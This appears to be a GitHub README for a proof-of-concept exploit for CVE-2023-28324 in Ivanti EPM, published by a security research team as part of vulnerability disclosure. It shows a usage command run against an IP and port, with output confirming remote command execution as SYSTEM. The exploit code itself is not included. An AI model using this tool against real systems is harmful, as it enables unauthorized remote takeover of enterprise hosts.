# CVE-2023-28324
POC for CVE-2023-28324 affecting Ivanti EPM.

## Technical Analysis
A technical root cause analysis of the vulnerability can be found on our blog:
https://www.horizon3.ai/attack-research/attack-blogs/cve-2023-28324-deep-dive/

## Summary
This POC abuses a vulnerability in `AgentPortal.exe` to execute arbitrary commands. In order for this POC to work, you
must provide your own references to `AgentPortal.exe` and `APCommon.dll` from an Ivanti EPM installation.

## Usage
```plaintext
CVE-2023-28324.exe 192.168.1.21 49668 whoami.exe
Sending request.
Request result: True
Waiting for result.
Waiting for result.
Result: nt authority\system
```

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
